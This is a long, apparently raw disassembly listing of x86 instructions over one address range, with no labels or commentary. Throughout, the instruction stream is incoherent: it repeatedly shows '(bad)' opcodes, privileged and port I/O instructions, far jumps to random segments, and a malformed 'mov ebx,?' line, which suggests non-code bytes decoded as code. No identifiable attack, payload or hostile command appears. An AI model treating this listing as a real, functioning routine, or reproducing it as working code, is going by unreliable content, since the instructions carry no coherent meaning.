  4185b9:	mov    BYTE PTR ds:0x69fec9d9,0xeb
  4185c0:	ret    0x1a45
  4185c3:	pop    edi
  4185c4:	pushf  
  4185c5:	adc    eax,0x48ef7d74
  4185ca:	cli    
  4185cb:	inc    edi
  4185cc:	test   DWORD PTR [ebx+0x55aa230b],esi
  4185d2:	pop    ecx
  4185d3:	cdq    
  4185d4:	loop   0x418592
  4185d6:	ret    
  4185d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185d8:	fdiv   QWORD PTR es:[esi+0x2b3d1a4e]
  4185df:	mov    cl,0x63
  4185e1:	dec    esp
  4185e2:	jmp    0x418598
  4185e4:	or     cl,BYTE PTR [edx-0x450c216a]
  4185ea:	ja     0x41857d
  4185ec:	sbb    edi,edx
  4185ee:	adc    dl,cl
  4185f0:	jo     0x418648
  4185f2:	psubw  mm6,mm1
  4185f5:	(bad)  
  4185f7:	xchg   edi,eax
  4185f8:	xchg   edi,eax
  4185f9:	daa    
  4185fa:	push   cs
  4185fb:	daa    
  4185fc:	push   ebp
  4185fd:	scas   al,BYTE PTR es:[edi]
  4185fe:	mov    ah,0x92
  418600:	and    DWORD PTR [ecx+0x3cebb1f5],esi
  418606:	dec    edx
  418607:	iret   
  418608:	ins    DWORD PTR es:[edi],dx
  418609:	aas    
  41860a:	sub    DWORD PTR [eax+0x67],0xc384991f
  418611:	inc    eax
  418612:	cmp    DWORD PTR [ecx-0x2082055d],ebp
  418618:	lods   eax,DWORD PTR ds:[esi]
  418619:	pusha  
  41861a:	mov    dl,0x46
  41861c:	lods   al,BYTE PTR ds:[esi]
  41861d:	les    ebp,FWORD PTR [ebp+0x3d]
  418620:	popf   
  418621:	sti    
  418622:	out    dx,al
  418623:	pop    ds
  418624:	and    ch,ah
  418626:	sub    al,0x87
  418628:	jae    0x418646
  41862a:	jge    0x418694
  41862c:	mov    eax,0x35862ab2
  418631:	retf   0x4dd1
  418634:	fmul   DWORD PTR [edi]
  418636:	mov    eax,ds:0x1505efc3
  41863b:	pop    eax
  41863c:	jecxz  0x4186bd
  41863e:	mov    al,ds:0x4da67a6d
  418643:	cdq    
  418644:	cmp    ecx,DWORD PTR [edi+0x153946d4]
  41864a:	add    eax,0x12c623cf
  41864f:	popa   
  418650:	arpl   WORD PTR [edx+ebp*1],bp
  418653:	and    ecx,edi
  418655:	rol    DWORD PTR [ebx+0x4d],cl
  418658:	nop
  418659:	cmp    BYTE PTR [si+0x2b],bl
  41865d:	push   edx
  41865e:	jns    0x4186a9
  418660:	shl    cl,0x17
  418663:	mov    ecx,0xe9e2ab2a
  418668:	mov    DWORD PTR [edi+0x77],ecx
  41866b:	mov    dl,0x9e
  41866d:	ins    DWORD PTR es:[edi],dx
  41866e:	xchg   ebx,eax
  41866f:	mov    eax,0x5320d3aa
  418674:	daa    
  418675:	(bad)  
  418676:	ss and al,0x44
  418679:	stos   DWORD PTR es:[edi],eax
  41867a:	mov    ecx,0xf34c41a4
  41867f:	sub    esp,edi
  418681:	mov    cl,0x3b
  418683:	cmp    BYTE PTR [esi+0x23],ah
  418686:	mov    dl,0xa7
  418688:	mov    bh,0x8c
  41868a:	stos   BYTE PTR es:[edi],al
  41868b:	jp     0x4186f0
  41868d:	mov    dl,0xa1
  41868f:	ins    DWORD PTR es:[edi],dx
  418690:	aad    0x6b
  418692:	mov    ebx,0x4f701b36
  418697:	sbb    ah,ah
  418699:	(bad)  
  41869a:	mov    dh,0x96
  41869c:	(bad)  
  41869d:	test   eax,0x4e9619c4
  4186a2:	pop    ebp
  4186a3:	cmp    dl,BYTE PTR [edx]
  4186a5:	ror    DWORD PTR [ebx],cl
  4186a7:	mov    ch,0x27
  4186a9:	mov    edx,0x382dc6fc
  4186ae:	call   0x7fca:0x1356e785
  4186b5:	shl    DWORD PTR [ecx-0x29a02e15],1
  4186bb:	or     DWORD PTR [esi+0x3393d93e],eax
  4186c1:	pop    es
  4186c2:	sub    DWORD PTR [ebx+0x136d020c],0xffffff89
  4186c9:	or     DWORD PTR [edi+0x35],0xce270e18
  4186d0:	fwait
  4186d1:	pop    esp
  4186d2:	call   0x51789135
  4186d7:	ja     0x4186e4
  4186d9:	or     eax,eax
  4186db:	pop    edx
  4186dc:	clc    
  4186dd:	xchg   esi,eax
  4186de:	cmp    ah,BYTE PTR [ebx]
  4186e0:	js     0x4186de
  4186e2:	mov    eax,0x48c4defe
  4186e7:	jg     0x41872a
  4186e9:	jmp    0x7f28:0xb76204e4
  4186f0:	and    ch,ah
  4186f2:	jecxz  0x418677
  4186f4:	mov    ecx,0xb0606cde
  4186f9:	jge    0x41871a
  4186fb:	mov    edi,DWORD PTR [ebx-0x35]
  4186fe:	ds push ecx
  418700:	in     al,0x3b
  418702:	repnz into 
  418704:	into   
  418705:	pop    es
  418706:	(bad)  
  418707:	retf   0x12dc
  41870a:	inc    edx
  41870b:	xchg   BYTE PTR [ebx+0x19],al
  41870e:	je     0x41872a
  418710:	repnz sbb al,0xa7
  418713:	out    dx,al
  418714:	pop    DWORD PTR [eax-0x61a86870]
  41871a:	pop    edx
  41871b:	add    dl,BYTE PTR [edx+0x3a]
  41871e:	push   ds
  41871f:	(bad)  
  418720:	xor    ch,BYTE PTR [eax+0x5e51c2da]
  418726:	(bad)  
  418728:	aad    0x41
  41872a:	sar    DWORD PTR [ecx],cl
  41872c:	xor    BYTE PTR ds:0x227fd6b0,bl
  418732:	repz jmp 0x58f46241
  418738:	push   cs
  418739:	fs push esi
  41873b:	cdq    
  41873c:	push   ds
  41873d:	and    al,0xfe
  41873f:	sbb    edx,ecx
  418741:	aas    
  418742:	jecxz  0x4186d0
  418744:	into   
  418745:	cdq    
  418746:	mov    esp,0x5313b8c3
  41874b:	daa    
  41874c:	and    ebp,DWORD PTR [ecx]
  41874e:	cli    
  41874f:	lods   al,BYTE PTR ds:[esi]
  418750:	mov    al,0x8c
  418752:	sbb    al,0xe5
  418754:	out    dx,al
  418755:	mov    cl,0xa1
  418757:	or     BYTE PTR [esi+0x3ded7be5],0xaa
  41875e:	xchg   ebp,eax
  41875f:	inc    ebp
  418760:	loope  0x41872f
  418762:	test   DWORD PTR [esi+ecx*4],ebp
  418765:	lods   eax,DWORD PTR ds:[esi]
  418766:	(bad)  
  418768:	scas   eax,DWORD PTR es:[edi]
  418769:	and    DWORD PTR [eax*4+0x24bd4e0a],eax
  418770:	scas   eax,DWORD PTR es:[edi]
  418771:	ror    ebp,0x1
  418774:	sbb    dh,dl
  418776:	icebp  
  418777:	add    eax,0x53b92f5c
  41877c:	in     eax,0xd
  41877e:	(bad)  [eax-0x16]
  418781:	dec    esp
  418782:	push   eax
  418783:	fist   DWORD PTR [edx]
  418785:	xchg   eax,esp
  418787:	data16 mov ah,0x5f
  41878a:	fwait
  41878b:	push   es
  41878c:	aad    0x15
  41878e:	data16 jg 0x418753
  418791:	cwde   
  418792:	mov    ecx,0xf200ef2e
  418797:	(bad)  
  418798:	pop    ds
  418799:	pop    eax
  41879a:	jle    0x65047d1c
  4187a0:	cli    
  4187a1:	xor    DWORD PTR [bp+si],ecx
  4187a4:	jge    0x418785
  4187a6:	addr16 mov ds,ebx
  4187a9:	dec    eax
  4187aa:	jne    0x418740
  4187ac:	or     BYTE PTR [eax],ch
  4187ae:	(bad)  
  4187af:	or     DWORD PTR ds:0x25042d78,ebx
  4187b5:	jl     0x4187db
  4187b7:	(bad)  
  4187b8:	std    
  4187b9:	lods   eax,DWORD PTR ds:[esi]
  4187ba:	inc    edi
  4187bb:	mov    bp,0x9a70
  4187bf:	pop    ecx
  4187c0:	imul   ecx,ebp,0x6b
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	(bad)  
  4187c6:	out    dx,al
  4187c7:	mov    ecx,0x655b598b
  4187cc:	mov    eax,ds:0x2801c4b3
  4187d1:	jbe    0x418824
  4187d3:	mov    BYTE PTR [eax-0x2bbe9e60],dl
  4187d9:	and    DWORD PTR [edx-0x41aed450],0xde0f9cef
  4187e3:	inc    edx
  4187e4:	mov    edi,DWORD PTR [bp+si-0x7f]
  4187e8:	xor    al,0xe2
  4187ea:	xchg   BYTE PTR [eax],dl
  4187ec:	call   0x93aa:0x53ef31b7
  4187f3:	pop    esp
  4187f4:	xor    eax,0xfdc36f
  4187f9:	rcr    DWORD PTR [ecx-0x2df85225],cl
  4187ff:	int    0xd4
  418801:	dec    ebx
  418802:	mov    esi,0x98df4321
  418807:	xor    DWORD PTR [ebx],edi
  418809:	rcr    BYTE PTR [esi+0x3545623f],0x93
  418810:	out    dx,al
  418811:	jae    0x41880e
  418813:	cs mov dl,0xbb
  418816:	test   eax,0x8889ef45
  41881b:	popa   
  41881c:	ss jnp 0x4187c1
  41881f:	js     0x4187cb
  418821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418822:	cmp    cl,0xd8
  418825:	push   esi
  418826:	push   ebx
  418827:	cmp    al,0xce
  418829:	pop    eax
  41882a:	jmp    0x418806
  41882c:	sub    ebp,DWORD PTR [eax-0x3b]
  41882f:	push   0x37b90c47
  418834:	dec    esi
  418835:	push   edi
  418836:	adc    BYTE PTR [ecx+0xa],bl
  418839:	push   edx
  41883a:	sub    DWORD PTR [esi+0x7471e917],esi
  418840:	cwde   
  418841:	adc    edx,DWORD PTR [esi+0x2c]
  418844:	bound  ebp,QWORD PTR [esi]
  418846:	test   BYTE PTR [esi-0x2fddb005],ah
  41884c:	fsub   DWORD PTR [eax]
  41884e:	scas   al,BYTE PTR es:[edi]
  41884f:	fwait
  418850:	pusha  
  418851:	ds inc eax
  418853:	je     0x4188bc
  418855:	(bad)  
  418857:	pop    eax
  418858:	sbb    DWORD PTR [esi-0x3365b6ca],esp
  41885e:	sbb    eax,0xaa91a6b1
  418863:	fbstp  TBYTE PTR ss:[ebx-0x72aed919]
  41886a:	arpl   WORD PTR [esp+edi*1],cx
  41886d:	cdq    
  41886e:	mov    bh,0x32
  418870:	ins    BYTE PTR es:[edi],dx
  418871:	fcom   DWORD PTR [ecx-0x22]
  418874:	fs xor esi,ebp
  418877:	shl    dh,1
  418879:	sahf   
  41887a:	and    DWORD PTR [ecx-0x62299e83],ebp
  418880:	cwde   
  418881:	ficomp DWORD PTR [edi+ebx*1-0x5]
  418885:	cmp    al,0x5c
  418887:	xlat   BYTE PTR ds:[ebx]
  418888:	(bad)  
  418889:	scas   eax,DWORD PTR es:[edi]
  41888a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41888b:	(bad)  
  41888c:	jno    0x4188d4
  41888e:	jmp    esp
  418890:	mov    dh,0xcd
  418892:	in     eax,dx
  418893:	push   cs
  418894:	and    eax,DWORD PTR [ecx+0x1c]
  418897:	lods   eax,DWORD PTR ds:[esi]
  418898:	or     dl,BYTE PTR [ebx+0x46a3f84e]
  41889e:	jl     0x41885e
  4188a0:	enter  0xf9db,0xf8
  4188a4:	jl     0x418876
  4188a6:	out    0xb5,eax
  4188a8:	icebp  
  4188a9:	ins    BYTE PTR es:[edi],dx
  4188aa:	jb     0x4188f1
  4188ac:	ret    0x5b40
  4188af:	(bad)  
  4188b0:	mov    ah,dh
  4188b2:	cmp    DWORD PTR [edi+0x4c],eax
  4188b5:	and    esi,ebp
  4188b7:	retf   
  4188b8:	loopne 0x418852
  4188ba:	fwait
  4188bb:	test   DWORD PTR [ebp+0x143855bc],esi
  4188c1:	imul   esp,DWORD PTR [ebp+0xc6cf18],0x21
  4188c8:	jge    0x41893b
  4188ca:	add    DWORD PTR ds:0x24c43c54,edi
  4188d0:	pusha  
  4188d1:	lods   al,BYTE PTR ds:[esi]
  4188d2:	lea    edi,[ebx]
  4188d4:	mov    WORD PTR ds:0x605ec2f0,ds
  4188da:	mov    DWORD PTR [eax+0x348872ce],ebp
  4188e0:	retf   
  4188e1:	jge    0x418876
  4188e3:	xor    DWORD PTR [eax-0x4077c389],edi
  4188e9:	in     al,dx
  4188ea:	mov    eax,0x815adc08
  4188ef:	imul   ebp,DWORD PTR [eax-0x49],0x9709252
  4188f6:	sbb    al,0xe7
  4188f8:	sti    
  4188f9:	lods   eax,DWORD PTR ds:[esi]
  4188fa:	es in  eax,0x3c
  4188fd:	jle    0x41889e
  4188ff:	bound  ebx,QWORD PTR [esi+0x7d]
  418902:	loop   0x418967
  418904:	inc    eax
  418905:	out    dx,al
  418906:	mov    ds:0xc2a1b19,eax
  41890b:	dec    edi
  41890c:	push   esp
  41890d:	int    0x57
  41890f:	mov    edx,0x750600c2
  418914:	fwait
  418915:	rol    DWORD PTR [ebx],0x79
  418918:	test   DWORD PTR [ecx+0x1a],ebx
  41891b:	out    dx,al
  41891c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41891d:	ss je  0x4188aa
  418920:	ret    0xc4c5
  418923:	sti    
  418924:	stos   DWORD PTR es:[edi],eax
  418925:	dec    edx
  418926:	les    edi,FWORD PTR [ebp+ebx*1-0x122447c]
  41892d:	cld    
  41892e:	js     0x4188cb
  418930:	add    ebx,ebp
  418932:	test   ch,ah
  418934:	iret   
  418935:	mov    ds:0x4baf7cc,eax
  41893a:	push   edx
  41893b:	jmp    FWORD PTR [esi+ebx*4+0x7fff47d2]
  418942:	add    cl,BYTE PTR [edi-0x23a11e93]
  418948:	ins    BYTE PTR es:[edi],dx
  418949:	ja     0x4188d1
  41894b:	add    eax,0xbb6b55c3
  418950:	int3   
  418951:	popf   
  418952:	mov    ecx,0xe620737e
  418957:	push   es
  418958:	rcr    DWORD PTR [eax+0x638c797e],1
  41895e:	ss test eax,0xb8f98a96
  418964:	xor    bl,BYTE PTR [ebp-0x6c]
  418967:	xchg   ecx,eax
  418968:	xchg   bp,ax
  41896a:	inc    ebp
  41896b:	pop    eax
  41896c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41896d:	sbb    eax,eax
  41896f:	ins    BYTE PTR es:[edi],dx
  418970:	not    DWORD PTR [edi+0x47]
  418973:	and    eax,0x202f0306
  418978:	leave  
  418979:	pop    edi
  41897a:	inc    ebx
  41897b:	outs   dx,BYTE PTR ds:[esi]
  41897c:	test   al,0x74
  41897e:	mov    ah,0x3a
  418980:	inc    eax
  418981:	scas   al,BYTE PTR es:[edi]
  418982:	stos   DWORD PTR es:[edi],eax
  418983:	ret    0xebe7
  418986:	jne    0x4189a5
  418988:	jns    0x4189fb
  41898a:	in     al,dx
  41898b:	push   edx
  41898c:	push   eax
  41898d:	sbb    ecx,DWORD PTR [ebp-0x703b5755]
  418993:	daa    
  418994:	stos   BYTE PTR es:[edi],al
  418995:	dec    eax
  418996:	rcr    eax,1
  418998:	popa   
  418999:	outs   dx,DWORD PTR ds:[esi]
  41899a:	xchg   edi,eax
  41899b:	inc    ebp
  41899c:	sub    BYTE PTR ds:0x7db4b46f,ah
  4189a2:	pop    DWORD PTR [ebx+0x585d8fda]
  4189a8:	inc    ebp
  4189a9:	xchg   BYTE PTR [esi],ah
  4189ab:	loopne 0x41895f
  4189ad:	add    bl,dh
  4189af:	out    0x18,al
  4189b1:	push   ds
  4189b2:	xlat   BYTE PTR ds:[ebx]
  4189b3:	int3   
  4189b4:	test   BYTE PTR [edi+0x38],cl
  4189b7:	rol    BYTE PTR [ecx-0x3389f969],0x18
  4189be:	shl    DWORD PTR [ebx],1
  4189c0:	dec    ebp
  4189c1:	addr16 cdq 
  4189c3:	(bad)
  4189c7:	pop    ecx
  4189c8:	scas   al,BYTE PTR es:[edi]
  4189c9:	sbb    al,0xb3
  4189cb:	push   0xffffffed
  4189cd:	fsubrp st(6),st
  4189cf:	mov    al,ds:0x9eb24438
  4189d4:	cld    
  4189d5:	xchg   edi,esi
  4189d7:	inc    ebx
  4189d8:	ja     0x4189d5
  4189da:	sar    dh,0x83
  4189dd:	cmp    BYTE PTR [esi],ch
  4189df:	rcl    DWORD PTR [ecx-0x3a],1
  4189e2:	adc    DWORD PTR [ecx-0x24],0xee047aab
  4189e9:	gs stos DWORD PTR es:[edi],eax
  4189eb:	sbb    BYTE PTR [ecx],0x88
  4189ee:	mov    eax,ds:0x24b99b0a
  4189f3:	outs   dx,DWORD PTR ds:[esi]
  4189f4:	(bad)  
  4189f6:	cmp    bl,BYTE PTR [eax+0x57]
  4189f9:	xchg   dh,bl
  4189fb:	and    eax,0x325d5ec6
  418a00:	fsub   st,st(7)
  418a02:	push   esi
  418a03:	push   0xffffffd8
  418a05:	loop   0x418a70
  418a07:	inc    sp
  418a09:	fld    st(5)
  418a0b:	jne    0x418a65
  418a0d:	ss es call 0x1f9d42e4
  418a14:	xchg   ecx,eax
  418a15:	xor    DWORD PTR [edx],0xffffff98
  418a18:	outs   dx,BYTE PTR ds:[esi]
  418a19:	adc    BYTE PTR [ecx+0x30],0xae
  418a1d:	data16 or al,0xd1
  418a20:	es jnp 0x4189df
  418a23:	nop
  418a24:	gs or  eax,0xa1278322
  418a2a:	adc    eax,0x2705ff4a
  418a2f:	sahf   
  418a30:	cwde   
  418a31:	push   edi
  418a32:	(bad)  
  418a33:	pop    ebx
  418a34:	add    DWORD PTR [ebx-0x5aca74d0],eax
  418a3a:	xchg   esp,eax
  418a3b:	xchg   dl,bl
  418a3d:	mov    bl,0xa3
  418a3f:	fist   WORD PTR [ecx+0x144753ab]
  418a45:	pop    edx
  418a46:	scas   eax,DWORD PTR es:[edi]
  418a47:	jne    0x418a5f
  418a49:	ret    
  418a4a:	push   ebp
  418a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4c:	(bad)
  418a51:	mov    eax,0x8b2be2b1
  418a56:	mov    al,0xf6
  418a58:	mov    edx,0x7c7d0f32
  418a5d:	icebp  
  418a5e:	fisubr WORD PTR [ebx]
  418a60:	xor    eax,0xdd4f82ef
  418a65:	xchg   edx,eax
  418a66:	jbe    0x418ae3
  418a68:	out    dx,eax
  418a69:	or     DWORD PTR [edx-0x36],ebx
  418a6c:	jnp    0x418a5b
  418a6e:	pop    ebx
  418a6f:	fcomp  QWORD PTR [ebp-0x1b44acf8]
  418a75:	inc    ebp
  418a76:	gs dec eax
  418a78:	ss pop esi
  418a7a:	scas   al,BYTE PTR es:[edi]
  418a7b:	outs   dx,BYTE PTR ds:[esi]
  418a7c:	inc    edi
  418a7d:	jns    0x418a7a
  418a7f:	ins    DWORD PTR es:[edi],dx
  418a80:	dec    ecx
  418a81:	sti    
  418a82:	leave  
  418a83:	adc    BYTE PTR [eax+0x34],ah
  418a86:	es xchg ebp,eax
  418a88:	aam    0x1e
  418a8a:	shl    DWORD PTR [esi+0x387871d8],cl
  418a90:	pop    ss
  418a91:	sub    ecx,edx
  418a93:	js     0x418a28
  418a95:	dec    esp
  418a96:	dec    edi
  418a97:	pop    edi
  418a98:	div    ebp
  418a9a:	mov    ds,ebp
  418a9c:	add    al,BYTE PTR [edi+eiz*8]
  418a9f:	mov    ah,0xd8
  418aa1:	ret    0xc988
  418aa4:	dec    edx
  418aa5:	dec    eax
  418aa6:	sub    edi,ebx
  418aa8:	pop    ds
  418aa9:	iret   
  418aaa:	cdq    
  418aab:	int    0x77
  418aad:	add    ch,bl
  418aaf:	xor    al,0xe3
  418ab1:	and    al,0x20
  418ab3:	(bad)  [ebp-0x33]
  418ab6:	cli    
  418ab7:	imul   eax,DWORD PTR [esi+ecx*4-0x2d02deef],0x4c149a5
  418ac2:	outs   dx,BYTE PTR ds:[esi]
  418ac3:	jp     0x418ac9
  418ac5:	or     ebx,ecx
  418ac7:	ins    BYTE PTR es:[edi],dx
  418ac8:	push   0x49d919c7
  418acd:	pop    edi
  418ace:	jbe    0x418aec
  418ad0:	jae    0x418af9
  418ad2:	mov    ecx,0xd895fe69
  418ad8:	loope  0x418aa5
  418ada:	out    dx,al
  418adb:	addr16 pop edi
  418add:	push   ss
  418ade:	in     al,dx
  418adf:	xor    BYTE PTR ds:0x6d8ef8bd,ah
  418ae5:	and    dh,dl
  418ae7:	in     eax,0x3d
  418ae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aea:	push   0x1
  418aec:	(bad)  
  418aed:	lods   al,BYTE PTR ds:[esi]
  418aee:	mov    esp,0xa07a758c
  418af3:	and    eax,0x297ea1a4
  418af8:	push   edx
  418af9:	not    ch
  418afb:	inc    ecx
  418afc:	call   0x9e2dd66e
  418b01:	mov    al,ds:0x7165bc
  418b06:	ret    
  418b07:	jo     0x418b41
  418b09:	daa    
  418b0a:	cmp    ebx,DWORD PTR [ebx]
  418b0c:	stc    
  418b0d:	fsub   QWORD PTR ss:[ecx-0x63725d9a]
  418b14:	inc    esp
  418b15:	push   0xffffffcf
  418b17:	popa   
  418b18:	(bad)  
  418b19:	repnz in al,0x32
  418b1c:	cli    
  418b1d:	cmp    eax,0x63096371
  418b22:	aam    0xa6
  418b24:	adc    DWORD PTR [eax-0x2700295e],esp
  418b2a:	mov    ds:0x43c31f44,eax
  418b2f:	jge    0x418b5f
  418b31:	inc    BYTE PTR ds:0x792d640a
  418b37:	aad    0xf9
  418b39:	movaps xmm0,XMMWORD PTR [edi]
  418b3c:	call   0xf8deb52
  418b41:	dec    ecx
  418b42:	shr    esi,0x65
  418b45:	mov    eax,ds:0x46e42fc
  418b4a:	lea    ebx,[esi-0x11]
  418b4d:	fcomp  QWORD PTR [esi+0x2d64803f]
  418b53:	inc    edx
  418b54:	pop    edi
  418b55:	dec    dx
  418b57:	xchg   esi,eax
  418b58:	hlt    
  418b59:	enter  0xe527,0x86
  418b5d:	inc    ebx
  418b5e:	lds    edx,FWORD PTR [edi-0x44]
  418b61:	mov    dh,0x24
  418b63:	(bad)  
  418b64:	leave  
  418b65:	pop    ss
  418b66:	mov    bl,0xa2
  418b68:	sti    
  418b69:	in     eax,dx
  418b6a:	ret    
  418b6b:	or     al,0x24
  418b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b6e:	rol    DWORD PTR fs:0x76dc63e6,0xd
  418b76:	int3   
  418b77:	aam    0x70
  418b79:	xor    al,BYTE PTR [edi+esi*8+0x38]
  418b7d:	(bad)  
  418b7e:	addr16 pusha 
  418b80:	retf   0xb0ec
  418b83:	mov    ch,ch
  418b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b86:	mov    cl,0xe9
  418b88:	into   
  418b89:	xchg   ebp,eax
  418b8a:	(bad)
  418b8d:	cmp    ebp,DWORD PTR [ecx]
  418b8f:	in     eax,0x12
  418b91:	aad    0xd0
  418b93:	imul   esi,DWORD PTR [ecx+0x40],0x903276c7
  418b9a:	rcr    BYTE PTR [ebx+edi*1+0x67],1
  418b9e:	jo     0x418bd9
  418ba0:	push   eax
  418ba1:	adc    al,0x11
  418ba3:	sub    eax,0xdd79fb70
  418ba8:	mov    DWORD PTR [esi-0x57164ac],0x3b122827
  418bb2:	out    dx,al
  418bb3:	in     al,dx
  418bb4:	pop    esi
  418bb5:	fs pusha 
  418bb7:	jns    0x418b4b
  418bb9:	arpl   WORD PTR [edi-0x6e],bx
  418bbc:	nop
  418bbd:	mov    al,0xe0
  418bbf:	mov    ch,0x2b
  418bc1:	cmp    bl,BYTE PTR [ebp+0x3b]
  418bc4:	cmp    al,0x9d
  418bc6:	fst    DWORD PTR [esi+0x5c]
  418bc9:	add    eax,0x6b2384e3
  418bce:	mov    bh,0xa5
  418bd0:	push   eax
  418bd1:	clc    
  418bd2:	mov    edi,0x4e75803b
  418bd7:	mov    cl,0x34
  418bd9:	lods   al,BYTE PTR ds:[esi]
  418bda:	xchg   edi,eax
  418bdb:	fwait
  418bdc:	push   edi
  418bdd:	inc    ebx
  418bde:	test   ebx,0x8a51a675
  418be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be6:	out    dx,eax
  418be7:	iret   
  418be8:	jg     0x418bf9
  418bea:	pop    ecx
  418beb:	sbb    al,0x28
  418bed:	pushf  
  418bee:	rcl    DWORD PTR [esi-0x638bec46],1
  418bf4:	inc    esp
  418bf5:	cmp    BYTE PTR [ebx-0x55],cl
  418bf8:	push   edx
  418bf9:	lock xlat BYTE PTR ds:[ebx]
  418bfb:	fldcw  WORD PTR [eax]
  418bfd:	je     0x418c43
  418bff:	dec    edx
  418c00:	adc    DWORD PTR [edi+0x6f],esi
  418c03:	or     ch,BYTE PTR [ecx-0x6c45f7a0]
  418c09:	inc    eax
  418c0a:	int    0xe6
  418c0c:	inc    ebx
  418c0d:	(bad)  
  418c0e:	jmp    FWORD PTR [ebp-0x2a5f050e]
  418c14:	cdq    
  418c15:	inc    ecx
  418c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c17:	push   0x62510ae6
  418c1c:	in     al,0x1e
  418c1e:	sti    
  418c1f:	fst    DWORD PTR [eax+0x2c539376]
  418c25:	xor    BYTE PTR [ecx-0x48],dl
  418c28:	jle    0x418c8b
  418c2a:	int3   
  418c2b:	out    0xf9,eax
  418c2d:	or     cl,BYTE PTR [edi+0x5]
  418c30:	add    BYTE PTR [ebx-0x413d01aa],ah
  418c36:	arpl   WORD PTR [ebp-0x19],si
  418c39:	push   ebx
  418c3a:	ficom  WORD PTR [esi]
  418c3c:	mov    ecx,0x970f052d
  418c41:	mov    bl,0x6d
  418c43:	mul    dh
  418c45:	test   al,ch
  418c47:	sbb    eax,0xb9a219d0
  418c4c:	leave  
  418c4d:	mov    ebx,?
  418c4f:	ret    0x2324
  418c52:	fld    QWORD PTR [ebp+0x21ecc113]
  418c58:	bound  esp,QWORD PTR [edx-0xd]
  418c5b:	mov    eax,0xb1e1415e
  418c60:	fisttp DWORD PTR [edi+ebx*1-0x5894540d]
  418c67:	sar    BYTE PTR [edi-0x31],0xfb
  418c6b:	in     al,0xe8
  418c6d:	popf   
  418c6e:	pop    esi
  418c6f:	mov    esp,0x7ceff9e
  418c74:	add    dh,BYTE PTR cs:[esi]
  418c77:	jge    0x418c41
  418c79:	adc    ecx,eax
  418c7b:	inc    eax
  418c7c:	mov    dh,0xe6
  418c7e:	jbe    0x418c5d
  418c80:	shl    BYTE PTR [eax],cl
  418c82:	jno    0x418c52
  418c84:	and    BYTE PTR [edi+eax*4-0x271ad2c4],0xc6
  418c8c:	int3   
  418c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c8e:	mov    ss:0xfe64c011,al
  418c94:	(bad)  
  418c96:	push   ds
  418c97:	push   0xffffff85
  418c99:	mov    dh,0x71
  418c9b:	pop    eax
  418c9c:	dec    eax
  418c9d:	sahf   
  418c9e:	sub    al,0x48
  418ca0:	adc    al,BYTE PTR [eax+0x365da314]
  418ca6:	rcl    bh,1
  418ca8:	add    BYTE PTR [esi+0x40f841c6],ah
  418cae:	(bad)  
  418caf:	mov    al,0x26
  418cb1:	mov    DWORD PTR [ebx-0x7adaee1],edx
  418cb7:	pop    ss
  418cb8:	or     DWORD PTR [esp+ebx*1-0x63af8f3a],edi
  418cbf:	and    edx,DWORD PTR [esi+edx*1+0x34]
  418cc3:	push   esp
  418cc4:	cmp    esi,edi
  418cc6:	lahf   
  418cc7:	mov    ch,0x18
  418cc9:	add    bh,BYTE PTR [edi-0x62]
  418ccc:	sbb    edi,ebp
  418cce:	out    0x28,al
  418cd0:	fsubr  st,st(0)
  418cd2:	add    al,0x32
  418cd4:	dec    esp
  418cd5:	sbb    al,0x1c
  418cd7:	jg     0x418d58
  418cd9:	addr16 je 0x418cd3
  418cdc:	mov    esp,0x2531a72b
  418ce1:	in     al,0x20
  418ce3:	jl     0x418d0a
  418ce5:	test   BYTE PTR [ecx+0x679eb194],bl
  418ceb:	mov    bh,0x3d
  418ced:	pusha  
  418cee:	push   ds
  418cef:	daa    
  418cf0:	outs   dx,DWORD PTR ds:[esi]
  418cf1:	inc    edi
  418cf2:	pop    eax
  418cf3:	mov    ds:0x34d0c379,al
  418cf8:	xor    BYTE PTR [esi+0x1868f158],0x14
  418cff:	mov    cl,0x1
  418d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d02:	dec    ecx
  418d03:	(bad)  
  418d05:	hlt    
  418d06:	and    ch,al
  418d08:	or     al,BYTE PTR [eax+0x13a206cf]
  418d0e:	xchg   ecx,eax
  418d0f:	xchg   edx,eax
  418d10:	shl    cl,0xe4
  418d13:	out    0xcc,al
  418d15:	sbb    ch,bh
  418d17:	adc    bl,BYTE PTR [edx+0x1e6f0e17]
  418d1d:	push   eax
  418d1e:	cdq    
  418d1f:	shl    BYTE PTR [ecx+0x38],0x5a
  418d23:	xor    edx,ecx
  418d25:	fdivr  QWORD PTR [edi-0x4b]
  418d28:	out    0x20,al
  418d2a:	adc    DWORD PTR [ebx],esp
  418d2c:	jmp    0x25a8bcc8
  418d31:	retf   0x6f3d
  418d34:	out    dx,al
  418d35:	les    edx,FWORD PTR [esi-0x21]
  418d38:	cmp    DWORD PTR [eax],esp
  418d3a:	sub    DWORD PTR [eax],edi
  418d3c:	sub    eax,0x985560fe
  418d41:	and    DWORD PTR [eax],ebp
  418d43:	lock jno 0x418d5c
  418d46:	mov    ch,0x8c
  418d48:	or     dl,BYTE PTR [eax+edx*2]
  418d4b:	or     esp,DWORD PTR [edi]
  418d4d:	xchg   BYTE PTR [eax+edx*8-0x65],bl
  418d51:	mov    bl,0x2b
  418d53:	sbb    BYTE PTR [edx+0x70fadfdc],0xf0
  418d5a:	xchg   ebp,eax
  418d5b:	sub    ecx,ecx
  418d5d:	mov    esi,0x338c983c
  418d62:	pop    ss
  418d63:	mov    eax,ds:0x707c8d30
  418d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d69:	icebp  
  418d6a:	mov    al,0xf8
  418d6c:	(bad)  
  418d6d:	je     0x418d48
  418d6f:	hlt    
